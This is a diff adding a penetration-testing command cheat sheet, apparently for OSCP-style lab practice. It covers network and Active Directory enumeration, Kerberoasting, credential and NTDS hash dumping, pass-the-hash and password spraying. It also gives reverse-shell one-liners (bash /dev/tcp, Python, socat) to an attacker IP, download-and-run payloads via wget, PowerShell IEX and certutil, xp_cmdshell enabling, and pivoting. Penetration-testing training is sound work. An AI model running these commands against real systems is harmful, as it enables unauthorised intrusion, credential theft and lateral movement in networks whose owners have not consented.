@@ -1,0 +1,445 @@
+######################################################################
+# CHEATSHEET - NETWORK & ENUMERATION
+######################################################################
+
+# Quick top 1000 TCP scan - basic enumeration
+nmap -sC -sV -oN nmap_quick_$targetip.txt $targetip
+
+# Full TCP port scan - find all open ports
+nmap -p- --min-rate 1500 -oN nmap_allports_$targetip.txt $targetip
+
+# Aggressive full TCP scan with tuning - deeper enumeration
+nmap -p- -Pn $targetip -v -T4 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmap_aggr_$targetip.txt
+
+# Service/version & default scripts on specific ports
+nmap -sC -sV -p <ports> -oN nmap_detail_$targetip.txt $targetip
+
+# UDP top ports scan - find important UDP services
+nmap -sU --top-ports 100 -oN nmap_udp_top100_$targetip.txt $targetip
+
+# Nmap script scan against HTTP services - web vuln checks
+nmap -sV --script=http-enum,http-title -p80,443,8080 -oN nmap_http_scripts_$targetip.txt $targetip
+
+# Nmap script scan against SMB services - smb enumeration
+nmap -sV --script=smb-enum-shares,smb-enum-users -p445 -oN nmap_smb_scripts_$targetip.txt $targetip
+
+
+######################################################################
+# WEB ENUMERATION
+######################################################################
+
+# Directory brute force - HTTP directory fuzzing (Gobuster)
+gobuster dir -u http://$targetip -w /usr/share/wordlists/dirb/common.txt -o gobuster_common_$targetip.txt
+
+# Directory brute force (big wordlist) - deeper discovery
+gobuster dir -u http://$targetip -w /usr/share/wordlists/dirb/big.txt -o gobuster_big_$targetip.txt
+
+# Recursive content discovery - Feroxbuster
+feroxbuster -u http://$targetip -w /usr/share/wordlists/dirb/common.txt -o ferox_$targetip.txt
+
+# Web fingerprinting - detect technologies
+whatweb $targetip
+
+# Basic web vuln scanning - Nikto
+nikto -h $targetip -output nikto_$targetip.txt
+
+
+######################################################################
+# SMB ENUMERATION
+######################################################################
+
+# List SMB shares with anonymous access - smbclient
+smbclient -L //$targetip/ -N
+
+# Connect to specific SMB share with anonymous auth
+smbclient -U "" //$targetip/$target
+
+# Connect to specific SMB share with empty password
+smbclient -N //$targetip/$target
+
+# List SMB shares and perform full enumeration - enum4linux
+enum4linux-ng -A $targetip | tee enum4linux_$targetip.txt
+
+# CrackMapExec SMB basic enumeration - check SMB info
+crackmapexec smb $targetip
+
+# CrackMapExec SMB auth check - username/password
+crackmapexec smb $targetip -u $user -p "$password"
+
+# CrackMapExec SMB share listing - list accessible shares
+crackmapexec smb $targetip -u $user -p "$password" --shares
+
+# NetExec SMB basic enumeration - SMB scan
+netexec smb $targetip
+
+# NetExec SMB users enumeration with creds
+netexec smb $targetip -u $user -p "$password" --users
+
+# NetExec SMB shares enumeration with creds
+netexec smb $targetip -u $user -p "$password" --shares
+
+# NetExec SMB RID brute forcing - enumerating users via RID
+netexec smb $targetip -u $user -p "$password" --rid-brute
+
+# NetExec SMB user enumeration with guest / anonymous
+netexec smb $targetip -u guest -p '' --users
+
+# NetExec SMB spider_plus module - crawl & download interesting files
+netexec smb $targetip -u $user -p "$password" -M spider_plus -o DOWNLOAD_FLAG=True
+
+
+######################################################################
+# RPC / SAMR ENUMERATION
+######################################################################
+
+# RPCClient anonymous login
+rpcclient -N $targetip
+
+# RPCClient null session with explicit syntax
+rpcclient -U "" -N $targetip
+
+# Enumerate domain users via RPCClient after login
+# (inside rpcclient prompt)
+# enumdomusers
+
+######################################################################
+# LDAP ENUMERATION
+######################################################################
+
+# Anonymous LDAP search - base DSE
+ldapsearch -x -H ldap://$targetip -s base
+
+# LDAP domain enumeration with base DN - AD users/groups
+ldapsearch -x -H ldap://$targetip -b "dc=$domain,dc=local"
+
+# NetExec LDAP users enumeration with anonymous or known creds
+netexec ldap $targetip -u "" -p "" --users
+netexec ldap $targetip -u $user -p "$password" --users
+
+
+######################################################################
+# WINRM & RDP ACCESS
+######################################################################
+
+# NetExec WINRM auth check - verify WinRM access
+netexec winrm $targetip -u $user -p "$password"
+
+# Evil-WinRM interactive PowerShell session
+evil-winrm -i $targetip -u $user -p "$password"
+
+# Evil-WinRM with hash instead of password
+evil-winrm -i $targetip -u $user -H <NTLM_HASH>
+
+# RDP connection using xfreerdp (Linux client)
+xfreerdp /v:$targetip /u:$user /p:"$password" /dynamic-resolution +clipboard
+
+# RDP connection with specific domain
+xfreerdp /v:$targetip /u:$domain\\$user /p:"$password" /dynamic-resolution +clipboard
+
+
+######################################################################
+# MSSQL ENUMERATION & EXPLOITATION
+######################################################################
+
+# MSSQL client with SQL authentication - Impacket mssqlclient
+mssqlclient.py $user:"$password"@$targetip -port 1433
+
+# MSSQL client with Windows authentication (AD)
+mssqlclient.py $domain/$user:"$password"@$targetip -windows-auth
+
+# Enable xp_cmdshell in MSSQL (inside mssqlclient)
+# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+# Execute OS commands via xp_cmdshell (inside mssqlclient)
+# EXEC xp_cmdshell 'whoami';
+
+
+######################################################################
+# IMPACKET - AUTH, KERBEROASTING, DUMPS, SHELLS
+######################################################################
+
+# Request service tickets for all SPNs - Kerberoasting
+impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $targetip -request
+
+# Kerberoasting with user list - output JtR-format hashes
+impacket-GetUserSPNs $domain/ -dc-ip $targetip -userfile users.txt -outputfile hashes_spn_john.txt -format john
+
+# AS-REP Roasting - find users without pre-auth
+impacket-GetNPUsers $domain/ -dc-ip $targetip -usersfile users.txt -format john -outputfile asrep_hashes.txt
+
+# Impacket WMIExec with cleartext password - remote semi-interactive shell
+impacket-wmiexec $domain/$user:"$password"@$targetip
+
+# Impacket WMIExec with NTLM hash - remote shell over RPC
+impacket-wmiexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
+
+# Impacket PSExec for interactive SYSTEM shell over SMB
+impacket-psexec $domain/$user:"$password"@$targetip
+
+# Impacket PSExec with hash - pass-the-hash over SMB
+impacket-psexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
+
+# Dump domain hashes from DC - NTDS.dit extraction (DC/DC-like)
+impacket-secretsdump $domain/$user:"$password"@$targetip
+
+# Dump only NTLM from DC - NTDS.dit quick dump
+impacket-secretsdump -just-dc-ntlm $domain/$user:"$password"@$targetip
+
+# Dump local SAM hashes remotely from a host
+impacket-secretsdump -sam SAM -system SYSTEM local
+
+# DCSync attack - dump domain hashes without touching ntds.dit directly
+impacket-secretsdump $domain/$user:"$password"@$targetip -just-dc
+
+######################################################################
+# NETEXEC / CRACKMAPEXEC - HASH DUMPING WORKFLOW
+######################################################################
+
+# NetExec SMB basic info
+netexec smb $targetip
+
+# NetExec SMB auth with creds
+netexec smb $targetip -u $user -p "$password"
+
+# Dump SAM db remotely with NetExec - local admin required
+netexec smb $targetip -u $user -p "$password" --sam | grep -v '[*]' | awk -F: '{print $4}' | tee dumped_hashes.txt
+
+# Dump LSASS creds with lsassy module - local admin required
+netexec smb $targetip -u $user -p "$password" -M lsassy | grep -v '[*]' | awk -F: '{print $6}' >> dumped_hashes.txt
+
+# Dump NTDS.dit via ntdsutil module - DA/local admin on DC required
+netexec smb $targetip -u $user -p "$password" -M ntdsutil | grep -v '[*]' | awk -F: '{print $4}' >> dumped_hashes.txt
+
+# Clean up dumped hash list - unique hashes only
+awk 'NF {print $1}' dumped_hashes.txt | sort | uniq | tee unique_hashes.txt
+
+# RID brute forcing users - generate userlist
+netexec smb $targetip -u $user -p "$password" --rid-brute | grep -Ei 'sid|typeuser' | awk '{print $6}' | cut -d'\' -f2 | tee users.txt
+
+# Password spray / hash spray over SMB with NetExec
+netexec smb $targetip users.txt -H unique_hashes.txt --continue-on-success
+
+# Password/hash spray over WinRM
+netexec winrm $targetip users.txt -H unique_hashes.txt --continue-on-success
+
+# Password/hash spray over LDAP
+netexec ldap $targetip users.txt -H unique_hashes.txt --continue-on-success
+
+# Password/hash spray over WMI
+netexec wmi $targetip users.txt -H unique_hashes.txt --continue-on-success
+
+
+######################################################################
+# GETTING SHELLS USING HASHES
+######################################################################
+
+# SMB shell with hash - PSExec pass-the-hash
+impacket-psexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
+
+# RPC/WMI shell with hash - WMExec pass-the-hash
+impacket-wmiexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
+
+# WinRM shell with hash - Evil-WinRM pass-the-hash
+evil-winrm -i $targetip -u $user -H <NTLMHASH>
+
+
+######################################################################
+# KERBEROS / USER ENUMERATION / GPP
+######################################################################
+
+# User enumeration against DC - Kerbrute userenum
+kerbrute userenum users.txt --dc $targetip -d $domain
+
+# Search Group Policy Preferences XML files in SMB/FS - gpp cpassword hunting
+# (use this idea: search for group.xml and cpassword)
+# Google Dork: "group.xml" "cpassword"
+
+# Decrypt GPP cpassword value - gpp-decrypt
+gpp-decrypt <cpassword_value>
+
+######################################################################
+# PASSWORD / HASH CRACKING
+######################################################################
+
+# Identify hash type - haiti
+haiti hashes.txt
+
+# John the Ripper against hash file with rockyou.txt
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# John: show cracked passwords
+john hashes.txt --show
+
+
+######################################################################
+# REVERSE SHELLS & STABILIZATION
+######################################################################
+
+# Netcat listener on attacker machine (Kali)
+nc -lvnp 4444
+
+# Bash reverse shell to $localip from target
+bash -i >& /dev/tcp/$localip/4444 0>&1
+
+# Python reverse shell to $localip from target
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$localip",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])'
+
+# Socat listener for fully interactive TTY on Kali
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# Socat reverse shell from target back to Kali
+socat tcp:$localip:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# Upgrade simple shell to TTY (Linux) - Python pty
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then in Kali: Ctrl+Z, stty raw -echo; fg; reset
+
+
+######################################################################
+# LINUX PRIVILEGE ESCALATION - QUICK ENUM
+######################################################################
+
+# Check current user and groups
+id
+whoami
+
+# Kernel, OS, architecture info
+uname -a
+cat /etc/os-release
+
+# Check sudo permissions - sudo privesc
+sudo -l
+
+# Find SUID binaries - SUID privesc
+find / -perm -4000 -type f 2>/dev/null
+
+# Find writable directories - world-writable paths
+find / -writable -type d 2>/dev/null
+
+# List cron jobs - cron privesc
+cat /etc/crontab
+ls -la /etc/cron.*
+
+# List capabilities - Linux capabilities privesc
+getcap -r / 2>/dev/null
+
+# Running processes - find interesting services
+ps aux
+
+# Network connections - find listening services
+ss -tunlp
+
+# Download and run LinPEAS from attacker host (example)
+wget http://$localip/linpeas.sh -O /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh
+
+
+######################################################################
+# WINDOWS PRIVILEGE ESCALATION - QUICK ENUM
+######################################################################
+
+# Who am I and privs
+whoami
+whoami /all
+
+# OS & patch info
+systeminfo
+
+# List users and groups
+net user
+net localgroup
+
+# Running processes
+tasklist
+
+# Network connections
+netstat -ano
+
+# Scheduled tasks
+schtasks /query /fo LIST /v
+
+# List services
+sc query state= all
+
+# Download and run winPEAS (example PowerShell)
+# (From WinRM or CMD/PS)
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$localip/winPEAS.ps1')"
+
+######################################################################
+# ACTIVE DIRECTORY ENUMERATION - BLOODHOUND
+######################################################################
+
+# Collect AD data with SharpHound on Windows target
+# Run from compromised Windows host
+Sharphound.exe -c All -d $domain -zipfilename loot_bloodhound.zip
+
+# Bloodhound tips:
+# - Upload loot_bloodhound.zip to your Kali
+# - Import into BloodHound GUI and analyze paths
+# (No direct command here; just workflow reminder)
+
+
+######################################################################
+# PIVOTING & PORT FORWARDING - CHISEL / SSH / SOCAT
+######################################################################
+
+########################
+# CHISEL PIVOTING
+########################
+
+# Start Chisel server on Kali (reverse mode SOCKS proxy)
+chisel server -p 9001 --reverse
+
+# On compromised target (client) - create reverse SOCKS proxy to Kali
+chisel client $localip:9001 R:socks
+
+# Use proxychains with SOCKS5 at 127.0.0.1:1080 (edit /etc/proxychains.conf)
+# Example proxied Nmap scan:
+# proxychains nmap -sT -Pn -n 10.10.20.10 -p 80,445
+
+########################
+# SSH PORT FORWARDING
+########################
+
+# Local port forward: forward Kali port 13389 to target's 3389 via pivot host
+ssh -L 13389:internal_rdp_host:3389 $user@$targetip
+
+# Remote port forward: expose local service 80 through remote host on port 8080
+ssh -R 0.0.0.0:8080:127.0.0.1:80 $user@$targetip
+
+# Dynamic SOCKS proxy via SSH - full pivot of traffic
+ssh -D 9050 $user@$targetip
+
+########################
+# SOCAT PORT FORWARDING
+########################
+
+# Socat port forward on Linux pivot host - forward local 0.0.0.0:8080 to 10.10.20.10:80
+socat TCP-LISTEN:8080,fork TCP:10.10.20.10:80
+
+# Socat reverse tunnel equivalent (if needed):
+# Run listener on Kali and connect from target appropriately
+
+
+######################################################################
+# MISC / GENERAL
+######################################################################
+
+# Save terminal session to file (good for OSCP reporting)
+script -t 2> timing.log -a session.log
+
+# Compress and exfiltrate directory from Linux
+tar czf loot.tar.gz /path/to/loot
+
+# Simple Python HTTP server on Kali for file hosting
+python3 -m http.server 80
+
+# Download from Python server via curl
+curl http://$localip/filename -o filename
+
+# Download via certutil on Windows
+certutil -urlcache -split -f http://$localip/file.exe file.exe
+
+######################################################################
+# END OF CHEATSHEET
+######################################################################
